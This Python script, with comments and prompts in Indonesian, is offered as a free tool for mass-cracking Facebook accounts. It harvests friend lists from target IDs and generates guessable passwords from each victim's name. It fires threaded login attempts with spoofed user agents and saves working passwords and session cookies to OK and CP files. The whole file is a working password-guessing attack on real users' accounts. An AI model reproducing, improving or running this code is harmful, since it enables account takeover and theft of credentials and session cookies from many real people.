# Sc Free Not Prem
# Open Source 
# Sc Recode By RFN
# Jangan Lupa Follow Fb Saya Rifan - Code
# Follow Github Me:github.com/Rfnn23
# Update 20-July-2023
#-----------------[ IMPORT-MODULE ]-------------------
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
pretty.install()
CON=sol()
#------------------[ USER-AGENT-DEFAULT ]-------------------#
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
    prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
    open('.proxy.txt','w').write(prox)
except Exception as e:
    exit(e)
###----------[ USER AGENT ]----------###
for t in range(10000):
	a=random.choice(['4','5','6','7','8','9','10','11','12','13','9.1.5','5.1.6','4.0.1','3.0.1','4.0.2','5.0.2','6.0.1','6.2.2','7.0.1','7.1.0','8.1.0','4.4.4','5.6.1','6.1.3'])
	b=random.choice(['en-us','en-gb','id-id','de-de','ru-ru','en-sg','fr-fr','fa-ir','ja-jp','pt-br','cs-cz','zh-hk','zh-cn','vi-vn','en-ph','en-in','tr-tr'])
	c=random.choice(['Redmi 7','Redmi Note 8','Redmi 6A','Mi 9 Lite','Redmi Note 11 Pro','Redmi 5A','Mi 9 SE','POCO M4 Pro','POCO X3 Pro','Redmi 5 Plus','Redmi Note 10 Pro','M2007J22G','Redmi 9C NFC'])
	d=random.choice(['OPM1','TP1A','RP1A','PPR1','PKQ1','QP1A','SP1A','RKQ1'])
	e=random.choice(['001','002','003','004','005','006','007','008','009','010','011','012','013','014','015','016','017','018','019','020'])
	f=random.randrange(111111,199999)
	g=random.randrange(10,300)
	h=random.randrange(1111,9999)
	i=random.randrange(20,100)
	j=random.choice(['EdgA/114.0.1823.68','OPR/67.0.2254.64753','XiaoMi/MiuiBrowser/12.7.5-go','Edg/94.0.992.50','OPR/67.0.2254.64753','XiaoMi/MiuiBrowser/13.28.0-gn','EdgA/98.0.1108.62','OPR/61.2.3076.56749','OPR/61.2.3076.56749'])
	rfn1=f'Mozilla/5.0 (Linux; Android {a}; {b}; {c} Build/{d}.{f}.{e}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{g}.0.{h}.{i} Mobile Safari/537.36 {j}'
	rfn2=f'Mozilla/5.0 (Linux; Android {a}; {b}; {c}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{g}.0.{h}.{i} Mobile Safari/537.36 {j}'
	uaku2 = random.choice([rfn1,rfn2])
	ugen.append(uaku2)
#------------[ INDICATION ]---------------#
id,id2,loop,ok,cp,akun,oprek,method,tokenku,uid= [],[],0,0,0,[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
#------------[ WARNA ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
#--------------------[ CONVERTER-BULAN ]--------------#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
#------------------[ MACHINE-SUPPORT ]---------------#
def rfn_xd(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def clear():
	os.system('clear')
def back():
	login()
#------------------[ LOGO-BANNER ]-----------------#
def banner():
	clear()
	rfn_xd(f"{P}*--> Sc Free Jangan Di Prem'in Master\n*--> Pakai Sewajarnya Aja Master\n*--> Salam Alok Awakening{N}")
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			print('[!] ConnectionError')
			exit()
	except IOError:
		login_lagi334()
def login_lagi334():
	try:
		os.system('clear')
		banner()
		ses = requests.Session()
		cok = input('\n[!] Masukan Cookie : ')
		ses.headers.update(
			{
				'content-type': 'application/x-www-form-urlencoded',
			}
		)
		data = {
				'access_token': '1348564698517390|007c0a9101b9e1c8ffab727666805038',
				'scope': ''
		}
		response = json.loads(ses.post('https://graph.facebook.com/v2.6/device/login/', data=data).text)
		code, user_code = response['code'], response['user_code']
		verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=1348564698517390%7C007c0a9101b9e1c8ffab727666805038&callback=LeetsharesCallback'.format(code))
		ses.headers.pop(
			'content-type'
		)
		ses.headers.update(
			{
				'sec-fetch-mode': 'navigate',
				'user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36',
				'sec-fetch-site': 'cross-site',
				'Host': 'm.facebook.com',
				'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
				'sec-fetch-dest': 'document',
			}
		)
		response2 = ses.get(verification_url, cookies = {'cookie': cok}).text
		if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
			exit('\n[!] cookie invalid')
		else:
			action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')
			fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1)
			jazoest = re.search('name="jazoest" value="(\d+)"', str(response2)).group(1)
			data = {
				'fb_dtsg': fb_dtsg,
				'jazoest': jazoest,
				'qr': 0,
				'user_code': user_code,
			}
			ses.headers.update(
				{
					'origin': 'https://m.facebook.com',
					'referer': verification_url,
					'content-type': 'application/x-www-form-urlencoded',
					'sec-fetch-site': 'same-origin',
				}
			)
			response3 = ses.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': cok})
			if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
				ses.headers.pop(
					'content-type'
				)
				ses.headers.pop(
					'origin'
				)
				response4 = ses.post(response3.url, data = data, cookies = {'cookie': cok}).text
				action = re.search('action="(.*?)"', str(response4)).group(1).replace('amp;', '')
				fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response4)).group(1)
				jazoest = re.search('name="jazoest" value="(\d+)"', str(response4)).group(1)
				scope = re.search('name="scope" value="(.*?)"', str(response4)).group(1)
				display = re.search('name="display" value="(.*?)"', str(response4)).group(1)
				user_code = re.search('name="user_code" value="(.*?)"', str(response4)).group(1)
				logger_id = re.search('name="logger_id" value="(.*?)"', str(response4)).group(1)
				auth_type = re.search('name="auth_type" value="(.*?)"', str(response4)).group(1)
				encrypted_post_body = re.search('name="encrypted_post_body" value="(.*?)"', str(response4)).group(1)
				return_format = re.search('name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)
				ses.headers.update(
					{
						'origin': 'https://m.facebook.com',
						'referer': response3.url,
						'content-type': 'application/x-www-form-urlencoded',
					}
				)
				data = {
					'fb_dtsg': fb_dtsg,
					'jazoest': jazoest,
					'scope': scope,
					'display': display,
					'user_code': user_code,
					'logger_id': logger_id,
					'auth_type': auth_type,
					'encrypted_post_body': encrypted_post_body,
					'return_format[]': return_format,
				}
				response5 = ses.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': cok}).text
				windows_referer = re.search('window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')
				ses.headers.pop(
					'content-type'
				)
				ses.headers.pop(
					'origin'
				)
				ses.headers.update(
					{
						'referer': 'https://m.facebook.com/',
					}
				)
				response6 = ses.get(windows_referer, cookies = {'cookie': cok}).text
				if 'Sukses!' in str(response6):
					ses.headers.update(
						{
							'sec-fetch-mode': 'no-cors',
							'referer': 'https://graph.facebook.com/',
							'Host': 'graph.facebook.com',
							'accept': '*/*',
							'sec-fetch-dest': 'script',
							'sec-fetch-site': 'cross-site',
						}
					)
					response7 = ses.get(status_url, cookies = {'cookie': cok}).text
					access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)
					tokenw = open(".token.txt", "w").write(access_token)
					cokiew = open(".cok.txt", "w").write(cok)
					rfn_xd(f'\n[!] Login  berhasil jalankan ulang perintah nya')
				else:
					exit('\n[+] login gagal')
		
	except Exception as e:
		rfn_xd('\n[!] Cookies Invalid Bro')
		os.system('rm -rf .cok.txt && rm -rf .token.txt')
		print(e)
		exit()
#------------------[ BAGIAN-MENU ]----------------#
def menu(my_name,my_id):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print('[×] Expired Cookies ')
		time.sleep(5)
		login_lagi334()
	os.system('clear')
	banner()
	print('')
	ip = requests.get("https://api.ipify.org").text
	rfn_xd(f'[{H}>{N}] Your Idz : {my_id}\n[{H}>{N}] Your Ip : {ip}')
	print('')
	rfn_xd(f'{P}1. Crack Public Massal\n2. Cek Hasil\n0. Exit{N}')
	_____rfn__xd_____ = input('[?] Select : ')
	print('')
	if _____rfn__xd_____ in ['1']:
		dump_massal()
	if _____rfn__xd_____ in ['2']:
		result()
	elif _____rfn__xd_____ in ['0']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		rfn_xd(f'[√] Success {M}Logout{N}')
		exit()
	else:
		print('>> input correctly ')
		back()
def error():
	print(f'{k}>> Sorry, this feature is still being fixed {x}')
	time.sleep(4)
	back()
#------------------[ BAGIAN-CEK HASIL ]----------------#
def result():
	rfn_xd(f'1. Hasil {H}OK{N} Kamu\n2. Hasil {K}CP{N} Kamu\n3. Kembali')
	kz = input(f'[?] Select : ')
	if kz in ['2','02']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print(' File Tidak Di Temukan ')
			time.sleep(3)
			back()
		if len(vin)==0:
			print(' Anda Tidak Memiliki Hasil CP ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'(%s) %s {k}%s{x} akun'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print(f'(%s) %s {k}%s{x} akun'%(cih,isi,(len(hem))))
			geeh = input(f'\n(?) Pilih  : ')
			try:geh = lol[geeh]
			except KeyError:
				print(' Pilih Yang Bener  ')
				exit()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print('File Tidak Di Temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print('')
				print(f'{x}{k}*---> {cpkuni[0]}|{cpkuni[1]}')
				nocp +=1
			print('')
			input(f'{x}[!] Click enter ')
			back()
	elif kz in ['1','01']: 
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print(' File Tidak Di Temukan ')
			time.sleep(2)
			back()
		if len(vin)==0:
			print('Tidak Mempunyai File OK ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(f'[%s] %s {h}%s{x} akun'%(nom,isi,len(hem)))
				else:
					lol.update({str(cih):str(isi)})
					print(f'[%s] %s {h}%s{x} akun'%(cih,isi,(len(hem))))
			geeh = input(f'\n(?) Pilih : ')
			try:geh = lol[geeh]
			except KeyError:
				print(' Pilih Yang Bener  ')
				exit()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print('File Tidak Di Temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print('')
				print(f'{x}{H}*---> {cpkuni[0]}|{cpkuni[1]}|{cpkuni[2]}{x}')
				nocp +=1
			print('')
			input(f'[!] Click enter ')
			back()
	elif kz in ['3','03']:
		back()
	else:
		print('Pilih Yang Bener ')
		exit()
#-------------------[ CRACK-PUBLIK ]----------------#
def dump_massal():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		jum = int(input('[?] input target amount : '))
	except ValueError:
		print('>> wrong input ')
		exit()
	if jum<1 or jum>100:
		rfn_xd('>> Failed Dump Id maybe id is not public ')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input('[>] Enter the Id '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print('>> unstable signal ')
			exit()
	try:
		rfn_xd(f'[>] Total Id Collected {h}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		print('>> unstable signal ')
		back()
	except (KeyError,IOError):
		print(f'>>{k} Friendship Not Public {x}')
		time.sleep(3)
		back()
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	print('')
	rfn_xd(f'{P}1. Id Old To New{N}\n{P}2. Id New To Old {N}({H}Recommended{N})\n{P}3. Id Random{N}')
	hu = input('[?] Select : ')
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)
			
	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print('>> input correctly ')
		exit()
		
	print('')
	rfn_xd(f'{P}1. Method Mobile{N}')
	hc = input('[?] Select : ')
	if hc in ['1','01']:
		method.append('mobile')
	else:
		method.append('mobile')
	print('')
	pwplus=input('[?] Password Manual ( Y/t ) ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		pwku=input('[>] Enter Password : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	passwrd()
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	print('')
	rfn_xd(f'[{H}>{N}] {H}OK{N} SAVE IN {H}OK/{okc}{N}\n[{K}>{N}] {K}CP{N} SAVE IN {K}CP/{cpc}{N}\n[{M}>{N}] Mainkan Mode {H}✈{N} Setiap 500 ID')
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'123')
					pwv.append(frs+'321')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'321')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			else:
				pool.submit(crack,idf,pwv)
	print('')
	rfn_xd(f'{P}[>] Crack Telah Selesai Jangan Lupa Amankan Hasil Cracknya{N}')
	rfn_xd(f'[{h}>{x}] {h}OK{x} : {h}%s{x} '%(ok))
	rfn_xd(f'[{k}>{x}] {k}CP{x} : {k}%s{x} '%(cp))
	rfn_xd(f'{P}[>] Good Bye Thanks To Using My Script{N}')
	time.sleep(2)
	back()
#--------------------[ METODE-MOBILE ]-----------------#
def crack(idf,pwv):
	global loop,ok,cp
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	print(f'\r%s%s/%s OK : %s CP : %s %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
	ua = random.choice(ugen)
	ses = requests.Session()
	for pw in pwv:
		try:
			link = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=761503727275074&kid_directed_site=0&app_id=761503727275074&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fapp_id%3D761503727275074%26cbt%3D1689827276337%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df3f43cffd7770a4%2526domain%253Dwww.iflix.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.iflix.com%25252Ff2d7c78c889b488%2526relation%253Dopener%26client_id%3D761503727275074%26display%3Dtouch%26domain%3Dwww.iflix.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.iflix.com%252Fid%252Fplay%252Fg231x7v7ajzcyn8-Naksir%252520Kamu%252Fj00457lf1k2-EP01%25253A%252520Naksir%252520Kamu%26locale%3Den_US%26logger_id%3Df37bfa1491c00d8%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df1ebabeb95710f4%2526domain%253Dwww.iflix.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.iflix.com%25252Ff2d7c78c889b488%2526relation%253Dopener%2526frame%253Df269f3e3f5c8e4%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26sdk%3Djoey%26version%3Dv3.3%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df1ebabeb95710f4%26domain%3Dwww.iflix.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.iflix.com%252Ff2d7c78c889b488%26relation%3Dopener%26frame%3Df269f3e3f5c8e4%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr') 
			data = {
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': re.search('name="try_number" value="(.*?)"',str(link.text)).group(1),
'unrecognized_tries': re.search('name="unrecognized_tries" value="(.*?)"',str(link.text)).group(1),
'email': idf,
'prefill_contact_point': idf,
'prefill_source': 'browser_onload',
'prefill_type': 'contact_point',
'first_prefill_source': 'browser_dropdown',
'first_prefill_type': 'contact_point',
'had_cp_prefilled': 'true',
'had_password_prefilled': 'false',
'is_smart_lock': 'false',
'bi_xrwh': '0',
'encpass': '#PWD_BROWSER:0:{}:{}'.format(re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),pw),
'fb_dtsg': '',
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'__dyn': '',
'__csr': '',
'__req': random.choice(['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '9', '0']), 
'__a': '',
'__user':0
}
			headers = {'Host': 'm.facebook.com','content-length': '2146','sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"','sec-ch-ua-mobile': '?1','user-agent': ua,'content-type': 'application/x-www-form-urlencoded','x-fb-lsd': 'AVqI9RPLQs0','x-asbd-id': '198387','save-data': 'on','sec-ch-ua-platform': '"Android"','accept': '*/*','origin': 'https://m.facebook.com','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=761503727275074&kid_directed_site=0&app_id=761503727275074&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fapp_id%3D761503727275074%26cbt%3D1689827276337%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df3f43cffd7770a4%2526domain%253Dwww.iflix.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.iflix.com%25252Ff2d7c78c889b488%2526relation%253Dopener%26client_id%3D761503727275074%26display%3Dtouch%26domain%3Dwww.iflix.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.iflix.com%252Fid%252Fplay%252Fg231x7v7ajzcyn8-Naksir%252520Kamu%252Fj00457lf1k2-EP01%25253A%252520Naksir%252520Kamu%26locale%3Den_US%26logger_id%3Df37bfa1491c00d8%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df1ebabeb95710f4%2526domain%253Dwww.iflix.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.iflix.com%25252Ff2d7c78c889b488%2526relation%253Dopener%2526frame%253Df269f3e3f5c8e4%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26sdk%3Djoey%26version%3Dv3.3%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df1ebabeb95710f4%26domain%3Dwww.iflix.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.iflix.com%252Ff2d7c78c889b488%26relation%3Dopener%26frame%3Df269f3e3f5c8e4%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?api_key=761503727275074&auth_token=fea9a0825a8e524716aed4794f0428fe&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fapp_id%3D761503727275074%26cbt%3D1689827276337%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df3f43cffd7770a4%2526domain%253Dwww.iflix.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.iflix.com%25252Ff2d7c78c889b488%2526relation%253Dopener%26client_id%3D761503727275074%26display%3Dtouch%26domain%3Dwww.iflix.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.iflix.com%252Fid%252Fplay%252Fg231x7v7ajzcyn8-Naksir%252520Kamu%252Fj00457lf1k2-EP01%25253A%252520Naksir%252520Kamu%26locale%3Den_US%26logger_id%3Df37bfa1491c00d8%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df1ebabeb95710f4%2526domain%253Dwww.iflix.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.iflix.com%25252Ff2d7c78c889b488%2526relation%253Dopener%2526frame%253Df269f3e3f5c8e4%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26sdk%3Djoey%26version%3Dv3.3%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&refsrc=deprecated&app_id=761503727275074&cancel=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df1ebabeb95710f4%26domain%3Dwww.iflix.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.iflix.com%252Ff2d7c78c889b488%26relation%3Dopener%26frame%3Df269f3e3f5c8e4%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&lwv=100',data=data,headers=headers)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r*--> {K}{idf}|{pw}{N}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r*--> {H}{idf}|{pw}|{kuki}{N}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#-----------------------[ SYSTEM-CONTROL ]--------------------#
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	login()

#>>>>> THANKS TO THIS HERE <<<<<<<#
#>>>>> RFN <<<<<#
